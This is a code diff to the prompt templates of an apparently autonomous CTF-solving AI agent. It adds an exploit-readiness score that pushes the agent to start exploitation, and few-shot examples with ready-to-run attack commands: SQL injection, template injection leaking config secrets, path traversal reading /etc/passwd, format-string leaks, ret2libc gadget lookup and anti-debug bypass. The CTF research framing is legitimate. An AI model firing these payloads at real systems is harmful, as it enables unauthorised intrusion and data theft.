@@ -305,11 +305,27 @@ class CTFSolvePrompt:
     3) Propose a minimal STATE delta (no full rewrite).
     4) List concrete issues and missing preconditions that blocked progress.
     5) Suggest the single next fact to pursue.
+    6) **CRITICAL**: Calculate exploit_readiness score to determine if exploitation should begin.
 
     RUBRIC
     - status: success if EXPECTED matched or signals clearly prove the target; partial if useful signals but not the target; fail otherwise.
     - Only promote facts that are unambiguous and reproducible.
     - Keep deltas small: add/patch, never drop unrelated fields.
+
+    EXPLOIT READINESS SCORING (0.0 - 1.0)
+    Calculate exploit_readiness based on collected evidence:
+    - +0.20: Vulnerability type confirmed (SQLi, BOF, SSTI, etc.)
+    - +0.20: Offset/length to control target (RIP offset, buffer size, injection point)
+    - +0.15: Memory leak obtained (libc base, stack address, canary value)
+    - +0.15: Target function/gadget identified (win function, system(), /bin/sh)
+    - +0.10: Protection status known (NX, PIE, ASLR, Canary status)
+    - +0.10: Crash/oracle behavior confirmed
+    - +0.10: Payload structure understood (ROP chain, format string, query syntax)
+
+    EXPLOITATION THRESHOLD
+    - If exploit_readiness >= 0.6: Set recommend_exploit = true
+    - If exploit_readiness >= 0.8: Set recommend_exploit = true with high priority note
+    - If iteration_count > 5 AND exploit_readiness >= 0.4: Set recommend_exploit = true (avoid endless exploration)
 
     OUTPUT — JSON ONLY
     {
@@ -317,6 +333,21 @@ class CTFSolvePrompt:
     "promote_facts": { "key":"value", ... },                 // stable facts to add/update
     "new_artifacts": [{"name":"...", "path":"..."}],         // from PARSED.artifacts
     "result_quality": { "signals": "<low|med|high>", "notes":"<=120 chars" },
+    "exploit_readiness": {
+        "score": 0.XX,                                         // 0.0 - 1.0
+        "components": {
+            "vuln_confirmed": true|false,
+            "offset_known": true|false,
+            "leak_obtained": true|false,
+            "target_identified": true|false,
+            "protections_known": true|false,
+            "crash_confirmed": true|false,
+            "payload_understood": true|false
+        },
+        "recommend_exploit": true|false,
+        "exploit_priority": "low|medium|high|critical",
+        "missing_for_exploit": ["list of missing pieces needed for exploitation"]
+    },
     "issues": [ "missing tool: gdb", "timeout", "no match for success regex" ],
     "prechecks_needed": [ "file_exists: ./dist/chall", "tool_in_path: python3" ],
     "state_delta": {
@@ -332,6 +363,7 @@ class CTFSolvePrompt:
     - Do not solve the challenge.
     - If PARSED.errors is non-empty or input unusable, set status="fail" and fill issues; still return a best-effort next_what_to_find.
     - Use short, deterministic strings; no markdown; no prose outside JSON.
+    - **CRITICAL**: If recommend_exploit is true, next_hint MUST suggest exploitation, NOT more reconnaissance.
     """
     
     plan_CoT = """
@@ -598,154 +630,349 @@ class CTFSolvePrompt:
 
 
 class few_Shot:
-    web_SQLI = """
-    {
-      "candidates": [
-        {
-          "function": "-",
-          "vuln": "SQLi",
-          "why": "Body/status and latency change on OR/SLEEP payloads at /login",
-          "cot_now": "Inject boolean/time-based payloads into the login endpoint and measure deltas. If reproducible, plan minimal UNION/COUNT probing to map schema with low impact. Record timeouts and WAF reactions for reliability.",
-          "tasks": [
-            {
-              "name": "boolean probe",
-              "cmd": "curl -s -X POST -d 'u=admin%27 OR 1=1--&p=x' http://target/login | tee r_bool.html",
-              "success": "re:<html|HTTP|token|welcome>",
-              "artifact": "r_bool.html"
-            },
-            {
-              "name": "time probe",
-              "cmd": "/usr/bin/time -f %E curl -s -X POST -d 'u=admin%27 AND SLEEP(5)--&p=x' http://target/login > /dev/null 2> t1.txt",
-              "success": "re:0?:0?5",
-              "artifact": "t1.txt"
-            }
-          ],
-          "expected_signals": [
-            { "type": "other", "name": "resp_diff", "hint": "Response body/status delta exists" },
-            { "type": "other", "name": "latency_delta", "hint": "Latency ≥5s" }
-          ]
-        }
-      ]
-    }
+    """
+    Few-shot examples for CTF planning prompts.
+    Format follows planning_prompt_CoT output schema:
+    - vuln: vulnerability type (Stack BOF, SQLi, SSTI, etc.)
+    - why: concrete evidence ≤120 chars
+    - cot_now: 2-4 sentences on immediate plan & rationale
+    - tasks: [{name, cmd, success, artifact}]
+    - expected_signals: [{type, name, hint}]
     """
 
-    web_SSTI = """
+    web_SQLI = """{
+  "candidates": [
     {
-      "candidates": [
+      "vuln": "SQL Injection",
+      "why": "Login form directly concatenates user input into SQL query without parameterization",
+      "cot_now": "First, test boolean-based SQLi with OR 1=1 payload to check for auth bypass. Then verify time-based blind SQLi with SLEEP to confirm injectable parameter. This establishes exploitability before deeper enumeration.",
+      "tasks": [
         {
-          "function": "-",
-          "vuln": "SSTI",
-          "why": "Double-brace patterns and expression evaluation suspected",
-          "cot_now": "Send {{7*6}} to verify expression evaluation. If rendered, safely test filters/attributes at low risk. Defer environment exposure to later steps.",
-          "tasks": [
-            {
-              "name": "arith check",
-              "cmd": "curl -s 'http://target/?q={{7*6}}' | tee ssti_probe.html",
-              "success": "42",
-              "artifact": "ssti_probe.html"
-            }
-          ],
-          "expected_signals": [
-            { "type": "other", "name": "expr_eval", "hint": "Literal '42' rendered" }
-          ]
+          "name": "boolean_sqli_test",
+          "cmd": "curl -s -X POST -d 'username=admin'\"'\" OR '\"'\"'1'\"'\"'='\"'\"'1&password=x' http://target/login -o sqli_bool.html",
+          "success": "re:welcome|dashboard|logged in|success",
+          "artifact": "sqli_bool.html"
+        },
+        {
+          "name": "time_based_sqli_test",
+          "cmd": "time curl -s -X POST -d 'username=admin'\"'\" AND SLEEP(3)--&password=x' http://target/login -o /dev/null 2>&1 | grep real",
+          "success": "re:0m[3-9]",
+          "artifact": "-"
         }
+      ],
+      "expected_signals": [
+        {"type": "other", "name": "auth_bypass", "hint": "Response contains success indicators"},
+        {"type": "other", "name": "time_delay", "hint": "Response delayed by 3+ seconds"}
       ]
     }
-    """
+  ]
+}"""
 
-    forensics_PCAP = """
+    web_SSTI = """{
+  "candidates": [
     {
-      "candidates": [
+      "vuln": "Server-Side Template Injection",
+      "why": "User input reflected in template without escaping; Jinja2/Twig syntax suspected from error msgs",
+      "cot_now": "Test basic arithmetic expression {{7*7}} to confirm template evaluation. If 49 appears in response, the injection point is confirmed. Then probe for template engine identification using engine-specific payloads.",
+      "tasks": [
         {
-          "function": "-",
-          "vuln": "Plaintext leak",
-          "why": "HTTP/FTP/Telnet may expose credentials in cleartext",
-          "cot_now": "Filter plaintext protocols with tshark and reassemble streams. Extract auth headers and token patterns to form a candidate secret list. Mask sensitive values.",
-          "tasks": [
-            {
-              "name": "proto filter",
-              "cmd": "tshark -r capture.pcapng -Y 'http.request || ftp || telnet' -T fields -e frame.time -e tcp.stream | tee hits.txt",
-              "success": "re:^\\d",
-              "artifact": "hits.txt"
-            },
-            {
-              "name": "reassemble",
-              "cmd": "mkdir -p streams; tshark -r capture.pcapng -qz follow,tcp,ascii,0 | tee streams/stream_0.txt",
-              "success": "re:HTTP|USER |PASS |Authorization:",
-              "artifact": "streams/stream_0.txt"
-            }
-          ],
-          "expected_signals": [
-            { "type": "other", "name": "cred_tokens", "hint": "Authorization/USER/PASS patterns match" }
-          ]
+          "name": "ssti_arithmetic_test",
+          "cmd": "curl -s 'http://target/search?q={{7*7}}' -o ssti_test.html && grep -o '49' ssti_test.html",
+          "success": "49",
+          "artifact": "ssti_test.html"
+        },
+        {
+          "name": "ssti_engine_identify",
+          "cmd": "curl -s 'http://target/search?q={{config}}' -o ssti_config.html",
+          "success": "re:SECRET_KEY|DEBUG|config",
+          "artifact": "ssti_config.html"
         }
+      ],
+      "expected_signals": [
+        {"type": "other", "name": "template_eval", "hint": "Arithmetic result 49 rendered in output"},
+        {"type": "leak", "name": "config_leak", "hint": "Application config exposed via template"}
       ]
     }
-    """
+  ]
+}"""
 
-    rev_CheckMapping = """
+    web_LFI = """{
+  "candidates": [
     {
-      "candidates": [
+      "vuln": "Local File Inclusion",
+      "why": "File parameter in URL accepts user input; no path validation observed in source",
+      "cot_now": "Attempt to read /etc/passwd using path traversal sequences. Test both encoded and plain traversal patterns. Success confirms arbitrary file read capability for further exploitation.",
+      "tasks": [
         {
-          "function": "-",
-          "vuln": "Logic check",
-          "why": "Strings/xrefs can reveal license/serial validation routine",
-          "cot_now": "Collect strings matching lic|serial|key and scan disassembly for compare/hash calls. Summarize input/output constraints to build a static map before dynamic hooks.",
-          "tasks": [
-            {
-              "name": "strings scan",
-              "cmd": "strings -a target | grep -i -E 'lic|serial|key|trial' | tee str_hits.txt",
-              "success": "re:lic|serial|key|trial",
-              "artifact": "str_hits.txt"
-            },
-            {
-              "name": "xref sweep",
-              "cmd": "objdump -d -M intel target | tee dis.txt",
-              "success": "re:cmp|call\\s+.*memcmp|strncmp|sha|md5",
-              "artifact": "dis.txt"
-            }
-          ],
-          "expected_signals": [
-            { "type": "symbol", "name": "validator_fn", "hint": "Function near compare/hash calls" }
-          ]
+          "name": "lfi_passwd_test",
+          "cmd": "curl -s 'http://target/view?file=../../../etc/passwd' -o lfi_passwd.txt && grep -c 'root:' lfi_passwd.txt",
+          "success": "re:^[1-9]",
+          "artifact": "lfi_passwd.txt"
+        },
+        {
+          "name": "lfi_encoded_test",
+          "cmd": "curl -s 'http://target/view?file=....//....//....//etc/passwd' -o lfi_encoded.txt",
+          "success": "root:x:0:0",
+          "artifact": "lfi_encoded.txt"
         }
+      ],
+      "expected_signals": [
+        {"type": "leak", "name": "passwd_leak", "hint": "/etc/passwd contents retrieved"},
+        {"type": "other", "name": "filter_bypass", "hint": "Path traversal filter bypassed"}
       ]
     }
-    """
+  ]
+}"""
 
-    stack_BOF = """
+    forensics_PCAP = """{
+  "candidates": [
     {
-      "candidates": [
+      "vuln": "Cleartext Credential Leak",
+      "why": "PCAP contains HTTP/FTP/Telnet traffic; credentials likely transmitted in plaintext",
+      "cot_now": "Extract HTTP POST requests and FTP commands from PCAP to find credentials. Filter for authentication-related packets first, then reassemble TCP streams for full context.",
+      "tasks": [
         {
-          "function": "vuln",
-          "vuln": "Stack BOF",
-          "why": "Stack copy without bounds; need canary/NX/PIE verification",
-          "cot_now": "Verify mitigations with checksec. In gdb, feed a cyclic pattern to derive the exact offset and observe residue near the return address. Use the result to branch into ret2win/ROP planning.",
-          "tasks": [
-            {
-              "name": "check mitigations",
-              "cmd": "checksec --file=./vuln | tee checksec.txt",
-              "success": "RELRO|Canary|NX|PIE",
-              "artifact": "checksec.txt"
-            },
-            {
-              "name": "run cyclic",
-              "cmd": "gdb -q ./vuln -ex 'set pagination off' -ex \"run < <(python3 -c 'import pwn;print(pwn.cyclic(600).decode())')\" -ex 'bt' -ex 'quit' | tee gdb_session.log",
-              "success": "re:Program received signal SIGSEGV",
-              "artifact": "gdb_session.log"
-            },
-            {
-              "name": "find offset",
-              "cmd": "python3 - <<'PY' | tee offset.txt\nimport re,pwn\ns=open('gdb_session.log','rb').read().decode(errors='ignore')\nm=re.search(r'(eip|rip)\\s+0x([0-9a-fA-F]+)',s)\nprint(pwn.cyclic_find(int(m.group(2),16)) if m else '')\nPY",
-              "success": "re:^\\d+$",
-              "artifact": "offset.txt"
-            }
-          ],
-          "expected_signals": [
-            { "type": "mitigation", "name": "NX/Canary/PIE", "hint": "Flags present in checksec output" },
-            { "type": "offset", "name": "ret_offset", "hint": "Integer offset value" }
-          ]
+          "name": "extract_http_posts",
+          "cmd": "tshark -r capture.pcap -Y 'http.request.method==POST' -T fields -e http.file_data > http_posts.txt",
+          "success": "re:user|pass|login|auth",
+          "artifact": "http_posts.txt"
+        },
+        {
+          "name": "extract_ftp_creds",
+          "cmd": "tshark -r capture.pcap -Y 'ftp.request.command==USER || ftp.request.command==PASS' -T fields -e ftp.request.arg > ftp_creds.txt",
+          "success": "re:.+",
+          "artifact": "ftp_creds.txt"
         }
+      ],
+      "expected_signals": [
+        {"type": "leak", "name": "http_credentials", "hint": "Username/password from HTTP POST"},
+        {"type": "leak", "name": "ftp_credentials", "hint": "FTP USER/PASS commands captured"}
       ]
     }
-    """
+  ]
+}"""
+
+    forensics_MEMORY = """{
+  "candidates": [
+    {
+      "vuln": "Memory Artifact Extraction",
+      "why": "Memory dump provided; process list and network connections may reveal malicious activity",
+      "cot_now": "First identify the OS profile using imageinfo. Then extract process list to find suspicious processes. Follow up with network connections and command history for evidence.",
+      "tasks": [
+        {
+          "name": "volatility_imageinfo",
+          "cmd": "vol.py -f memory.dmp imageinfo > imageinfo.txt 2>&1",
+          "success": "re:Suggested Profile",
+          "artifact": "imageinfo.txt"
+        },
+        {
+          "name": "volatility_pslist",
+          "cmd": "vol.py -f memory.dmp --profile=Win7SP1x64 pslist > pslist.txt 2>&1",
+          "success": "re:System|explorer|cmd",
+          "artifact": "pslist.txt"
+        }
+      ],
+      "expected_signals": [
+        {"type": "other", "name": "os_profile", "hint": "Memory dump OS version identified"},
+        {"type": "other", "name": "process_list", "hint": "Running processes extracted"}
+      ]
+    }
+  ]
+}"""
+
+    rev_static_analysis = """{
+  "candidates": [
+    {
+      "vuln": "License Check Bypass",
+      "why": "Binary contains strcmp/memcmp calls near license-related strings; validation logic identified",
+      "cot_now": "Extract strings to find license-related keywords. Then disassemble to locate validation function and understand the comparison logic. Map input constraints for keygen development.",
+      "tasks": [
+        {
+          "name": "strings_analysis",
+          "cmd": "strings -a target_binary | grep -iE 'license|serial|key|valid|wrong|correct' > strings_license.txt",
+          "success": "re:license|serial|key",
+          "artifact": "strings_license.txt"
+        },
+        {
+          "name": "objdump_disasm",
+          "cmd": "objdump -d -M intel target_binary > disasm.txt && grep -A20 'strcmp\\|memcmp' disasm.txt > compare_funcs.txt",
+          "success": "re:cmp|je|jne",
+          "artifact": "compare_funcs.txt"
+        }
+      ],
+      "expected_signals": [
+        {"type": "other", "name": "license_strings", "hint": "License-related strings found"},
+        {"type": "symbol", "name": "validation_func", "hint": "Comparison function location identified"}
+      ]
+    }
+  ]
+}"""
+
+    rev_dynamic_analysis = """{
+  "candidates": [
+    {
+      "vuln": "Anti-Debug Bypass",
+      "why": "Binary uses ptrace/IsDebuggerPresent; debugger detection prevents analysis",
+      "cot_now": "First identify anti-debug techniques by checking for ptrace calls or timing checks. Then patch or bypass these checks using LD_PRELOAD or debugger scripts to enable dynamic analysis.",
+      "tasks": [
+        {
+          "name": "find_antidebug",
+          "cmd": "objdump -d target_binary | grep -E 'ptrace|IsDebugger|rdtsc' > antidebug.txt",
+          "success": "re:ptrace|IsDebugger|rdtsc",
+          "artifact": "antidebug.txt"
+        },
+        {
+          "name": "ltrace_analysis",
+          "cmd": "ltrace -o ltrace.log ./target_binary testinput 2>&1; head -50 ltrace.log",
+          "success": "re:strcmp|memcmp|strlen",
+          "artifact": "ltrace.log"
+        }
+      ],
+      "expected_signals": [
+        {"type": "mitigation", "name": "antidebug_found", "hint": "Anti-debugging technique identified"},
+        {"type": "other", "name": "lib_calls", "hint": "Library call trace captured"}
+      ]
+    }
+  ]
+}"""
+
+    pwn_stack_bof = """{
+  "candidates": [
+    {
+      "vuln": "Stack Buffer Overflow",
+      "why": "gets()/strcpy() used without bounds check; buffer size 64 bytes, no canary detected",
+      "cot_now": "Verify protections with checksec to confirm no canary/PIE. Then find exact offset to return address using cyclic pattern. This offset is essential for crafting the exploit payload.",
+      "tasks": [
+        {
+          "name": "checksec_verify",
+          "cmd": "checksec --file=./vuln > checksec.txt 2>&1",
+          "success": "re:Canary.*disabled|No canary",
+          "artifact": "checksec.txt"
+        },
+        {
+          "name": "find_offset",
+          "cmd": "python3 -c 'from pwn import *; print(cyclic(200).decode())' | ./vuln 2>&1; dmesg | tail -5 > crash.log",
+          "success": "re:segfault|SIGSEGV",
+          "artifact": "crash.log"
+        }
+      ],
+      "expected_signals": [
+        {"type": "mitigation", "name": "no_canary", "hint": "Stack canary disabled"},
+        {"type": "crash", "name": "overflow_crash", "hint": "Segfault triggered by overflow"},
+        {"type": "offset", "name": "ret_offset", "hint": "Offset to return address"}
+      ]
+    }
+  ]
+}"""
+
+    pwn_format_string = """{
+  "candidates": [
+    {
+      "vuln": "Format String",
+      "why": "printf(user_input) without format specifier; allows arbitrary read/write",
+      "cot_now": "Test format string vulnerability by leaking stack values with %p. Then identify the offset where our input appears on stack for precise targeting. This enables GOT overwrite or return address manipulation.",
+      "tasks": [
+        {
+          "name": "leak_stack",
+          "cmd": "echo 'AAAA%p.%p.%p.%p.%p.%p.%p.%p' | ./vuln > fmtstr_leak.txt 2>&1",
+          "success": "re:0x[0-9a-f]+",
+          "artifact": "fmtstr_leak.txt"
+        },
+        {
+          "name": "find_offset",
+          "cmd": "echo 'AAAA%6\\$x' | ./vuln > fmtstr_offset.txt 2>&1 && grep -o '41414141' fmtstr_offset.txt",
+          "success": "41414141",
+          "artifact": "fmtstr_offset.txt"
+        }
+      ],
+      "expected_signals": [
+        {"type": "leak", "name": "stack_leak", "hint": "Stack addresses leaked via %p"},
+        {"type": "offset", "name": "input_offset", "hint": "Position of input on stack"}
+      ]
+    }
+  ]
+}"""
+
+    pwn_ret2libc = """{
+  "candidates": [
+    {
+      "vuln": "Return-to-libc",
+      "why": "NX enabled, ASLR off; can chain system() with /bin/sh string from libc",
+      "cot_now": "First leak libc base address using format string or puts GOT. Then locate system() and /bin/sh offsets in libc. Construct ROP chain: pop rdi; ret -> /bin/sh -> system().",
+      "tasks": [
+        {
+          "name": "find_libc_base",
+          "cmd": "ldd ./vuln | grep libc | awk '{print $3}' > libc_path.txt && readelf -s $(cat libc_path.txt) | grep ' system@' > libc_system.txt",
+          "success": "re:system",
+          "artifact": "libc_system.txt"
+        },
+        {
+          "name": "find_binsh",
+          "cmd": "strings -a -t x $(cat libc_path.txt) | grep '/bin/sh' > binsh_offset.txt",
+          "success": "re:/bin/sh",
+          "artifact": "binsh_offset.txt"
+        }
+      ],
+      "expected_signals": [
+        {"type": "symbol", "name": "system_addr", "hint": "system() address in libc"},
+        {"type": "symbol", "name": "binsh_addr", "hint": "/bin/sh string address"}
+      ]
+    }
+  ]
+}"""
+
+    crypto_weak_rsa = """{
+  "candidates": [
+    {
+      "vuln": "Weak RSA",
+      "why": "Small public exponent e=3 or small modulus n; vulnerable to low-exponent attack",
+      "cot_now": "Extract RSA parameters from public key. Check if n is factorable using factordb or if e is small enough for cube root attack. Compute private key d once factorization succeeds.",
+      "tasks": [
+        {
+          "name": "extract_rsa_params",
+          "cmd": "openssl rsa -pubin -in pub.pem -text -noout > rsa_params.txt 2>&1",
+          "success": "re:Modulus|Exponent",
+          "artifact": "rsa_params.txt"
+        },
+        {
+          "name": "factor_n",
+          "cmd": "python3 -c 'from Crypto.PublicKey import RSA; k=RSA.import_key(open(\"pub.pem\").read()); print(f\"n={k.n}\\ne={k.e}\")' > n_e.txt",
+          "success": "re:n=\\d+",
+          "artifact": "n_e.txt"
+        }
+      ],
+      "expected_signals": [
+        {"type": "other", "name": "rsa_params", "hint": "RSA n and e extracted"},
+        {"type": "other", "name": "factorization", "hint": "n factored into p and q"}
+      ]
+    }
+  ]
+}"""
+
+    crypto_xor = """{
+  "candidates": [
+    {
+      "vuln": "XOR with Known Plaintext",
+      "why": "Ciphertext XORed with repeating key; known plaintext header enables key recovery",
+      "cot_now": "XOR known plaintext (e.g., file header) with ciphertext to recover key bytes. Once partial key found, extend using pattern repetition. Decrypt full ciphertext with recovered key.",
+      "tasks": [
+        {
+          "name": "xor_key_recovery",
+          "cmd": "python3 -c 'ct=open(\"cipher.bin\",\"rb\").read()[:8]; pt=b\"flag{aaa\"; print(bytes(a^b for a,b in zip(ct,pt)).hex())' > key_partial.txt",
+          "success": "re:[0-9a-f]+",
+          "artifact": "key_partial.txt"
+        },
+        {
+          "name": "frequency_analysis",
+          "cmd": "python3 -c 'import collections; ct=open(\"cipher.bin\",\"rb\").read(); print(collections.Counter(ct).most_common(10))' > freq.txt",
+          "success": "re:\\(\\d+,",
+          "artifact": "freq.txt"
+        }
+      ],
+      "expected_signals": [
+        {"type": "leak", "name": "partial_key", "hint": "XOR key bytes recovered"},
+        {"type": "other", "name": "frequency", "hint": "Byte frequency distribution"}
+      ]
+    }
+  ]
+}"""
